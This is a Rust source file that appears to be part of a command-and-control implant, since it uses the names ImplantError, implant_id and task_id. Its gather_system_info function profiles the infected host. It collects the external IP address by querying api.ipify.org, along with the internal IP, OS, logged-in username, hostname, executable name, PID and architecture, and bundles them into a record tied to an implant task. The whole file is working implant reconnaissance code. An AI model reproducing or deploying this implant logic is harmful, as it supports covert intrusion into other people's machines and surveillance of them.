use gethostname::gethostname;
use local_ip_address::list_afinet_netifas;
use reqwest;
use std::ffi::OsString;
use std::{env, process};
use users::get_current_username;

use crate::errors::ImplantError;
use crate::models::system_info::SystemInfo;

pub fn gather_system_info(task_id: String, implant_id: &str) -> Result<SystemInfo, ImplantError> {
    let external_ip_address = get_external_ip_address()?;
    let internal_ip_address = get_internal_ip_address()?;
    let os_type = (env::consts::OS).to_owned();
    let machine_user = get_current_user().into_string()?;
    let machine_name = gethostname().into_string()?;
    let process_name = get_current_executable_name();
    let pid = process::id().try_into().unwrap();
    let architecture = (env::consts::ARCH).to_owned();

    let system_info = SystemInfo::new(
        external_ip_address,
        internal_ip_address,
        os_type,
        machine_user,
        machine_name,
        process_name,
        pid,
        architecture,
        task_id,
        implant_id.to_owned(),
    );

    Ok(system_info)
}

fn get_external_ip_address() -> Result<String, ImplantError> {
    let external_ip_address = reqwest::blocking::get("http://api.ipify.org/")?.text()?;
    Ok(external_ip_address)
}

fn get_internal_ip_address() -> Result<String, local_ip_address::Error> {
    let network_interfaces = list_afinet_netifas()?;

    for (name, ip) in network_interfaces {
        if name != "lo:" {
            return Ok(ip.to_string());
        }
    }

    Ok("Not found".to_owned())
}

fn get_current_user() -> OsString {
    let current_username = get_current_username();

    if let Some(username) = current_username {
        username
    } else {
        OsString::new()
    }
}

fn get_current_executable_name() -> String {
    let exec_name_opt = std::env::current_exe()
        .ok()
        .and_then(|pb| pb.file_name().map(|s| s.to_os_string()))
        .and_then(|s| s.into_string().ok());

    if let Some(exec_name) = exec_name_opt {
        exec_name
    } else {
        String::new()
    }
}
